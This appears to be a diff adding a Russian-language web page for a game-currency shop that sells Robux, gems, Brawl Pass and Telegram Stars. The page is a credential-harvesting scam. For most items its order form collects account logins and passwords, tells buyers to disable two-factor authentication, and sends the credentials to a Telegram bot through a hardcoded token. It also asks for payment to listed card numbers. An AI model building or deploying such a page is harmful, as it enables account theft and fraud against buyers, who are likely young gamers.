@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ambal Abu - Магазин игровой валюты</title>
+    <style>
+        :root {
+            --bg-color: #0f0f1a;
+            --card-bg: #1a1a2e;
+            --accent: #00f2fe;
+            --text: #ffffff;
+            --text-muted: #a0a0b0;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text);
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: var(--card-bg);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 2px solid var(--accent);
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.3);
+        }
+        h1 { margin: 0; color: var(--accent); }
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 10px;
+            font-size: 0.9em;
+            color: var(--text-muted);
+        }
+        .stats span { background: rgba(255,255,255,0.1); padding: 5px 10px; border-radius: 5px; }
+        .container { max-width: 1200px; margin: 20px auto; padding: 0 20px; }
+        .category-title {
+            text-align: center;
+            margin: 40px 0 20px;
+            color: var(--accent);
+            text-transform: uppercase;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        .card {
+            background-color: var(--card-bg);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 242, 254, 0.2);
+            border-color: var(--accent);
+        }
+        .price { font-size: 1.5em; font-weight: bold; margin: 15px 0; color: #4facfe; }
+        .btn {
+            background: linear-gradient(45deg, #00f2fe, #4facfe);
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            transition: opacity 0.3s;
+        }
+        .btn:hover { opacity: 0.8; }
+        
+        /* Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            border: 1px solid var(--accent);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .modal h2 { margin-top: 0; color: var(--accent); }
+        .form-group { margin-bottom: 15px; text-align: left; }
+        .form-group label { display: block; margin-bottom: 5px; color: var(--text-muted); }
+        .form-group input {
+            width: 100%; padding: 10px; border-radius: 5px;
+            border: 1px solid #444; background: #2a2a3e; color: #fff;
+            box-sizing: border-box;
+        }
+        .warning {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff4444;
+            padding: 10px;
+            margin: 15px 0;
+            font-size: 0.9em;
+        }
+        .payment-info {
+            background: rgba(0, 242, 254, 0.1);
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            font-size: 0.9em;
+            line-height: 1.5;
+        }
+        .close-btn { background: #ff4444; margin-top: 10px; }
+        footer {
+            text-align: center; margin-top: 50px; padding: 20px; border-top: 1px solid #333;
+        }
+        footer a { color: var(--accent); text-decoration: none; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Ambal Abu</h1>
+    <p>Надежный магазин игровой валюты</p>
+    <div class="stats">
+        <span>🛒 Робуксы: 48 отзывов</span>
+        <span>⭐ Звёзды: 12 отзывов</span>
+        <span>🏆 Brawl Pass: 5 отзывов</span>
+    </div>
+</header>
+
+<div class="container">
+    <!-- Gems -->
+    <h2 class="category-title">💎 99 Ночей в лесу (Гемы) 💎</h2>
+    <div class="grid">
+        <div class="card"><h3>20 Гемов</h3><div class="price">19 000 СУМ</div><button class="btn" onclick="openModal('20 Гемов (99 Ночей)', '19 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>100 Гемов</h3><div class="price">50 000 СУМ</div><button class="btn" onclick="openModal('100 Гемов (99 Ночей)', '50 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>250 Гемов</h3><div class="price">90 000 СУМ</div><button class="btn" onclick="openModal('250 Гемов (99 Ночей)', '90 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>500 Гемов</h3><div class="price">185 000 СУМ</div><button class="btn" onclick="openModal('500 Гемов (99 Ночей)', '185 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>700 Гемов</h3><div class="price">220 000 СУМ</div><button class="btn" onclick="openModal('700 Гемов (99 Ночей)', '220 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>1400 Гемов</h3><div class="price">400 000 СУМ</div><button class="btn" onclick="openModal('1400 Гемов (99 Ночей)', '400 000 СУМ', 'login')">Купить</button></div>
+    </div>
+
+    <!-- Brawl Pass -->
+    <h2 class="category-title">❤️ Brawl Pass ❤️</h2>
+    <div class="grid">
+        <div class="card"><h3>Brawl Pass</h3><div class="price">110 000 СУМ</div><button class="btn" onclick="openModal('Brawl Pass', '110 000 СУМ', 'brawl')">Купить</button></div>
+        <div class="card"><h3>Brawl Pass Plus</h3><div class="price">130 000 СУМ</div><button class="btn" onclick="openModal('Brawl Pass Plus', '130 000 СУМ', 'brawl')">Купить</button></div>
+        <div class="card"><h3>Pro Pass</h3><div class="price">180 000 СУМ</div><button class="btn" onclick="openModal('Pro Pass', '180 000 СУМ', 'brawl')">Купить</button></div>
+    </div>
+
+    <!-- Telegram Stars -->
+    <h2 class="category-title">🌟 Telegram Звёзды 🌟</h2>
+    <div class="grid">
+        <div class="card"><h3>50 Звёзд</h3><div class="price">14 000 СУМ</div><button class="btn" onclick="openModal('50 TG Звёзд', '14 000 СУМ', 'tg')">Купить</button></div>
+        <div class="card"><h3>75 Звёзд</h3><div class="price">20 000 СУМ</div><button class="btn" onclick="openModal('75 TG Звёзд', '20 000 СУМ', 'tg')">Купить</button></div>
+        <div class="card"><h3>100 Звёзд</h3><div class="price">25 000 СУМ</div><button class="btn" onclick="openModal('100 TG Звёзд', '25 000 СУМ', 'tg')">Купить</button></div>
+        <div class="card"><h3>150 Звёзд</h3><div class="price">40 000 СУМ</div><button class="btn" onclick="openModal('150 TG Звёзд', '40 000 СУМ', 'tg')">Купить</button></div>
+        <div class="card"><h3>250 Звёзд</h3><div class="price">65 000 СУМ</div><button class="btn" onclick="openModal('250 TG Звёзд', '65 000 СУМ', 'tg')">Купить</button></div>
+        <div class="card"><h3>350 Звёзд</h3><div class="price">95 000 СУМ</div><button class="btn" onclick="openModal('350 TG Звёзд', '95 000 СУМ', 'tg')">Купить</button></div>
+    </div>
+
+    <!-- Robux -->
+    <h2 class="category-title">🤑 Робуксы 🤤</h2>
+    <div class="grid">
+        <div class="card"><h3>40 Робуксов</h3><div class="price">15 000 СУМ</div><button class="btn" onclick="openModal('40 Робуксов', '15 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>80 Робуксов</h3><div class="price">20 000 СУМ</div><button class="btn" onclick="openModal('80 Робуксов', '20 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>120 Робуксов</h3><div class="price">35 000 СУМ</div><button class="btn" onclick="openModal('120 Робуксов', '35 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>200 Робуксов</h3><div class="price">50 000 СУМ</div><button class="btn" onclick="openModal('200 Робуксов', '50 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>500 Робуксов</h3><div class="price">70 000 СУМ</div><button class="btn" onclick="openModal('500 Робуксов', '70 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>1000 Робуксов</h3><div class="price">135 000 СУМ</div><button class="btn" onclick="openModal('1000 Робуксов', '135 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>2000 Робуксов</h3><div class="price">260 000 СУМ</div><button class="btn" onclick="openModal('2000 Робуксов', '260 000 СУМ', 'login')">Купить</button></div>
+        <div class="card"><h3>4500 Робуксов</h3><div class="price">650 000 СУМ</div><button class="btn" onclick="openModal('4500 Робуксов', '650 000 СУМ', 'login')">Купить</button></div>
+    </div>
+</div>
+
+<footer>
+    <p>Контакты для связи (Telegram):</p>
+    <p><a href="https://t.me/abubakr_aj" target="_blank">@abubakr_aj</a> | <a href="https://t.me/Best_stars_uz_Manager" target="_blank">@Best_stars_uz_Manager</a></p>
+    <p>© 2026 Ambal Abu.</p>
+</footer>
+
+<div class="modal-overlay" id="orderModal">
+    <div class="modal">
+        <h2 id="modalTitle">Оформление заказа</h2>
+        <p>К оплате: <strong id="modalPrice" style="color: var(--accent);"></strong></p>
+        
+        <div class="payment-info">
+            <strong>КАК ОПЛАТИТЬ:</strong><br><br>
+            <strong>Через банкомат Paynet:</strong><br>
+            1. В поиске банкомата введите "Пополнение Visa" или "Пополнение Humo".<br>
+            2. Для Visa может выйти предупреждение (банк РУз) - нажмите "Да".<br>
+            3. Введите номер карты:<br>
+            💳 <strong>VISA:</strong> 4023 0610 6612 5490<br>
+            💳 <strong>HUMO:</strong> 9860 1766 1906 3983<br>
+            4. Введите свой номер телефона.<br><br>
+            <strong>Через приложение банка:</strong><br>
+            Просто переведите нужную сумму на карту по номерам выше.<br>
+        </div>
+
+        <div class="warning">
+            ⚠️ <strong>ВНИМАНИЕ!</strong> Оплата должна быть РОВНО той суммы, которая указана к оплате. Ни больше, ни меньше! Администрация не несет ответственности, если вы перевели неправильную сумму.
+        </div>
+
+        <div id="dynamicFields">
+        </div>
+
+        <button class="btn" onclick="submitOrder()">Отправить данные менеджеру</button>
+        <button class="btn close-btn" onclick="closeModal()">Отмена</button>
+    </div>
+</div>
+
+<script>
+    let currentItem = '';
+    let currentPrice = '';
+    let currentType = '';
+
+    function openModal(item, price, type) {
+        currentItem = item;
+        currentPrice = price;
+        currentType = type;
+        
+        document.getElementById('modalTitle').innerText = `Покупка: ${item}`;
+        document.getElementById('modalPrice').innerText = price;
+        
+        const fields = document.getElementById('dynamicFields');
+        fields.innerHTML = ''; 
+
+        if (type === 'tg') {
+            fields.innerHTML = `
+                <div class="form-group">
+                    <label>Ваш Telegram @username (или ссылка):</label>
+                    <input type="text" id="tgUser" placeholder="@username" required>
+                </div>`;
+        } else if (type === 'brawl') {
+            fields.innerHTML = `
+                <div class="warning">
+                    Для покупки Brawl Pass нам потребуется зайти на ваш Supercell ID. Укажите почту, а код мы запросим в Telegram!
+                </div>
+                <div class="form-group">
+                    <label>Ваша электронная почта (Supercell ID):</label>
+                    <input type="email" id="bsEmail" placeholder="email@gmail.com" required>
+                </div>
+                <div class="form-group">
+                    <label>Ваш контактный Telegram (куда мы напишем за кодом):</label>
+                    <input type="text" id="contactUser" placeholder="@username" required>
+                </div>`;
+        } else if (type === 'login') {
+            fields.innerHTML = `
+                <div class="warning">
+                    ⚠️ <strong>ВАЖНО:</strong> Отключите двухэтапную верификацию (2FA) в настройках безопасности аккаунта перед отправкой данных, иначе мы не сможем зайти и выдать товар!
+                </div>
+                <div class="form-group">
+                    <label>Логин (Имя пользователя/Почта):</label>
+                    <input type="text" id="accLogin" required>
+                </div>
+                <div class="form-group">
+                    <label>Пароль:</label>
+                    <input type="password" id="accPass" required>
+                </div>
+                <div class="form-group">
+                    <label>Ваш контактный Telegram:</label>
+                    <input type="text" id="contactUser" placeholder="@username" required>
+                </div>`;
+        }
+
+        document.getElementById('orderModal').style.display = 'flex';
+    }
+
+    function closeModal() {
+        document.getElementById('orderModal').style.display = 'none';
+    }
+
+    function submitOrder() {
+        let message = `🛒 НОВЫЙ ЗАКАЗ!\nТовар: ${currentItem}\nСумма: ${currentPrice}\n\n`;
+        
+        if (currentType === 'tg') {
+            message += `Username: ${document.getElementById('tgUser').value}`;
+        } else if (currentType === 'brawl') {
+            message += `Почта Supercell: ${document.getElementById('bsEmail').value}\nСвязь: ${document.getElementById('contactUser').value}`;
+        } else if (currentType === 'login') {
+            message += `Логин: ${document.getElementById('accLogin').value}\nПароль: ${document.getElementById('accPass').value}\nСвязь: ${document.getElementById('contactUser').value}`;
+        }
+
+        const BOT_TOKEN = '8842092553:AAHZAmoner3mZwYmuApPLRrjhixhdjEbmU4';
+        const CHAT_ID = '5550209645'; 
+        
+        const btn = document.querySelector('#orderModal .btn');
+        const originalText = btn.innerText;
+        btn.innerText = 'Отправка...';
+        btn.disabled = true;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        }).then(response => {
+            document.getElementById('dynamicFields').innerHTML = `
+                <div style="text-align: center; color: #00f2fe; font-size: 1.2em; padding: 20px; border: 1px solid #00f2fe; border-radius: 10px; background: rgba(0, 242, 254, 0.1);">
+                    ✅ Заказ успешно оформлен!<br>Скоро мы свяжемся с вами.
+                </div>
+            `;
+            setTimeout(() => {
+                closeModal();
+                btn.innerText = originalText;
+                btn.disabled = false;
+            }, 3000);
+        }).catch(error => {
+            alert('Ошибка при отправке заказа. Проверьте интернет.');
+            btn.innerText = originalText;
+            btn.disabled = false;
+        });
+    }
+</script>
+
+</body>
+</html>
